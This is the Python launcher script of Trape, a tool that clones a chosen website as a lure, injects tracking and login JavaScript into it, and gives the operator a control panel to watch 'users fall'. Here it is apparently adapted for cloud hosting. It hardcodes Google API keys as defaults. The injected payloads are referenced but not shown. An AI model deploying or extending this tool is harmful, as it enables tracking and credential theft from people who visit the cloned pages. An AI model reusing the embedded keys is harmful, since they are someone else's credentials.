#!/usr/bin/env python
# -*- coding: utf-8 -*-
import time
import json
import builtins
builtins.input = lambda *args: ""
import urllib
from core.dependence import urllib2
import http.client 
import argparse
import socket
import sys
import os
from core.utils import utils
import subprocess
import requests
import hashlib, binascii
from threading import Timer
from multiprocessing import Process
import atexit

class Trape(object):
    def __init__(self, stat = 0):
        self.name_trape = "Trape"
        self.version = "2.1"
        self.stats_path = "ngrok"
        self.home_path = utils.generateToken(18)
        self.logout_path = utils.generateToken(6)
        self.remove_path = utils.generateToken(14)
        self.injectURL = utils.generateToken(12) + '.js'
        self.stats_key = utils.generateToken(24)
        self.date_start = time.strftime("%Y-%m-%d - %H:%M:%S")
        self.stat = stat
        self.localIp = '127.0.0.1'
        self.nGrokUrl = ''

        self.JSFiles = ({"path" : "base.js", "src" : utils.generateToken(12)},{"path" : "libs.min.js", "src" : utils.generateToken(12)},{"path" : "login.js", "src" : utils.generateToken(12)},{"path" : "payload.js", "src" : utils.generateToken(12)},{"path" : "trape.js", "src" : utils.generateToken(12)},{"path" : "vscript.js", "src" : utils.generateToken(12)},{"path" : "custom.js", "src" : utils.generateToken(12)},)
        self.CSSFiles = ({"path" : "/static/img/favicon.ico", "src" : utils.generateToken(12)},{"path" : "/static/img/favicon.png", "src" : utils.generateToken(12)},{"path" : "/static/css/base-icons.css", "src" : utils.generateToken(12)},{"path" : "/static/css/styles.css", "src" : utils.generateToken(12)},{"path" : "/static/css/normalize.min.css", "src" : utils.generateToken(12)},{"path": "/static/css/services-icons.css", "src" : utils.generateToken(12)},)

        if self.stat == 1:
            c = http.client.HTTPConnection('www.google.com', timeout=5)
            try:
                c.request("HEAD", "/")
                c.close()
            except Exception as e:
                c.close()
                utils.Go("\033[H\033[J")
                utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "NOTICE: " + utils.Color['white'] + "Trape needs Internet connection for working" + "\n\t")
                sys.exit(0)

            if (not(os.path.exists("trape.config"))):
                self.ngrok = ''
                self.gmaps = 'AIzaSyA30wEa2DwUuddmNTHvoprhnrB2w_aCWbs'
                self.ipinfo = ''
                self.googl = 'AIzaSyDHMDTOGo9L1OBl5vRxOVM6vpXOXVp5jCc'
            else:
                try:
                    config_trape = json.load(open("trape.config"))
                    self.ngrok = config_trape['ngrok_token']
                    self.gmaps = config_trape['gmaps_api_key']
                    self.ipinfo = config_trape['ipinfo_api_key']
                    if self.gmaps == '':
                        self.gmaps = 'AIzaSyA30wEa2DwUuddmNTHvoprhnrB2w_aCWbs'
                    self.googl = config_trape['gshortener_api_key']
                    if self.googl == '':
                        self.googl = 'AIzaSyDHMDTOGo9L1OBl5vRxOVM6vpXOXVp5jCc'
                except Exception as error:
                    os.remove('trape.config')
                    self.ngrok = ''
                    self.gmaps = 'AIzaSyA30wEa2DwUuddmNTHvoprhnrB2w_aCWbs'
                    self.ipinfo = ''
                    self.googl = 'AIzaSyDHMDTOGo9L1OBl5vRxOVM6vpXOXVp5jCc'
            
            parser = argparse.ArgumentParser("python3 trape.py -u <<Url>> -p <<Port>>")
            parser.add_argument('-u', '--url', dest='url', help='Put the web page url to clone')
            parser.add_argument('-p', '--port', dest='port', help='Insert your port')
            parser.add_argument('-ak', '--accesskey', dest='accesskey', help='Insert your custom key access')
            parser.add_argument('-l', '--local', dest='local', help='Insert your home file')
            parser.add_argument('-n', '--ngrok', dest='ngrok', help='Insert your ngrok Authtoken', action='store_true')
            parser.add_argument('-ic', '--injectcode', dest='injc', help='Insert your custom REST API path')
            parser.add_argument('-ud', '--update', dest='update', action='store_true', default=False, help='Update trape to the latest version')

            options = parser.parse_args()

            self.type_lure = 'global'

            if options.update:
                utils.Go("\033[H\033[J")
                utils.Go("Updating..." + " " + utils.Color['blue'] + "trape" + utils.Color['white'] + "..." + "\n")
                subprocess.check_output(["git", "reset", "--hard", "origin/master"])
                subprocess.check_output(["git", "pull"])
                utils.Go("Trape Updated... Please execute again...")
                sys.exit(0)

            if options.url is None:
                utils.Go("\033[H\033[J")
                utils.Go("----------------------------------------------")
                utils.Go("" + " " + utils.Color['redBold'] + "TRAPE" + utils.Color['white'] +" {" + utils.Color['yellowBold'] + "stable" + utils.Color['white'] + "}" + utils.Color['white'] + " - " + "Osint and analytics tool" + " " + "<" +utils.Color['white'])
                utils.Go("----------------------------------------------")
                utils.Go("| v" + utils.Color['redBold'] + self.version + utils.Color['white'] + " |")    
                utils.Go("--------" + "\n")
                
                options.url = "https://www.google.com"

            if options.port is None:
                options.port = os.environ.get('PORT', '8080')

            utils.Go("")
            utils.Go(utils.Color['greenBold'] + "-" + utils.Color['white'] + " Successful " + utils.Color['greenBold'] + "startup" + utils.Color['white'] + ", get lucky on the way!" + utils.Color['white'])
            utils.Go("")
            time.sleep(0.1)

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                self.localIp = s.getsockname()[0]
            except Exception:
                self.localIp = '0.0.0.0'

            self.app_port = int(options.port)
            self.url_to_clone = str(options.url)
            if self.url_to_clone[0:4] != 'http':
                self.url_to_clone = 'http://' + self.url_to_clone
            self.victim_path = options.url.replace("http://", "").replace("https://", "")
            
            if (options.injc):
                self.injectURL = options.injc

            if (options.accesskey):
                self.stats_key = options.accesskey

    def header(self):
        if self.stat == 1:
            utils.banner()

            try:
                changeLog = requests.get("https://raw.githubusercontent.com/jofpin/trape/master/version.txt", timeout = 4)
                changeLog = changeLog.text.split(" ")[1]
                changeLog = changeLog.strip()
                if changeLog != self.version:
                    utils.Go(utils.Color['white'] + "\t" + utils.Color['yellowBold'] + "@" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['whiteBold'] + " " + "UPDATES:" + " " + utils.Color['yellowBold'] + "NEW VERSION IS AVAILABLE: " + utils.Color['white'] + "v" + utils.Color['redBold'] + changeLog + utils.Color['white'] + " " + "(install changes)")
                    utils.Go("")
                else:
                    utils.Go(utils.Color['white'] + "\t" + utils.Color['yellowBold'] + "@" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['whiteBold'] + " " + "UPDATES:" + " " + utils.Color['greenBold'] + "RUNNING RECENT VERSION" + utils.Color['white'])
                    utils.Go("")
            except Exception:
                pass

            utils.Go(utils.Color['white'] + "\t" + utils.Color['whiteBold'] + "LOCAL INFORMATION" + utils.Text['end'])
            utils.Go("\t" + "-------------------")
            utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Lure for the users: " + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.victim_path)
            utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Your REST API path: " + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.injectURL + utils.Color['white'])
            utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Control Panel Link: " + utils.Color['blue'] + "http://127.0.0.1:" + utils.Color['blue'] + str(self.app_port) + '/' + self.stats_path)
            utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Your Access key: " + utils.Color['blue'] + self.stats_key + utils.Color['white'])
            utils.Go("")
            
            utils.Go("\n" + utils.Color['white'])
            utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + ">" + utils.Color['white'] + "]" + utils.Color['whiteBold'] + " " + "Start time:" + " " + utils.Color['white'] + self.date_start)
            utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "?" + utils.Color['white'] + "]" + utils.Color['white'] + " " + "Do not forget to close " + self.name_trape + ", after use. Press Control C" + " " + utils.Color['white'] + '\n')
            utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "¡" + utils.Color['white'] + "]" + utils.Color['white'] + " " + "Waiting for the users to fall..." + "\n")

    def rootConnection(self):
        pass

    def loadCheck(self):
        utils.checkOS()
        
    def main(self):
        import core.sockets

    def trape_config(self):
        utils.Go("Configuration is bypassed for cloud deployment.")

    def injectCSS_Paths(self, code):
        code = code.replace("[FAVICON_HREF]", self.CSSFiles[0]['src'])
        code = code.replace("[FAVICON_PNG_HREF]",self.CSSFiles[1]['src'])
        code = code.replace("[BASE_ICONS_HREF]", self.CSSFiles[2]['src'])
        code = code.replace("[STYLES_HREF]", self.CSSFiles[3]['src'])
        code = code.replace("[NORMALIZE_HREF]", self.CSSFiles[4]['src'])
        code = code.replace("[SERVICES_ICONS_HREF]", self.CSSFiles[5]['src'])
        return code

if "nt" in os.name:
    pass
else:
    import readline
    readline.parse_and_bind("tab:complete")
    readline.set_completer(utils.niceShell)

if __name__ == '__main__':
    trape_app = Trape(stat=1)
    trape_app.header()
    trape_app.main()
